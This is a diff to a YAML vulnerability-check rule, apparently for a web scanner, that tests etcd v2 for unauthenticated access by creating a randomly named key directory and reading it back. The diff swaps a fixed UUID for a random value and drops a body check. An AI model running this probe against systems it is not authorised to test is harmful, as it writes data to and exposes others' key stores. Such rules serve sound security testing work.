@@ -1,15 +1,17 @@
 name: poc-yaml-etcd-unauth
+set:
+  r1: randomLowercase(32)
 rules:
   - method: PUT
-    path: /v2/keys/56f161cf-8902-4ed0-8a46-df3b214342ae?dir=true
+    path: /v2/keys/{{r1}}?dir=true
     follow_redirects: false
     expression: |
       status == 201
   - method: GET
-    path: /v2/keys/?quorum=false&recursive=false&sorted=false
+    path: /v2/keys/{{r1}}?quorum=false&recursive=false&sorted=false
     follow_redirects: false
     expression: |
-      status == 200 && body.bcontains(b'56f161cf-8902-4ed0-8a46-df3b214342ae')
+      status == 200
 
 detail:
   author: j4ckzh0u(https://github.com/j4ckzh0u)
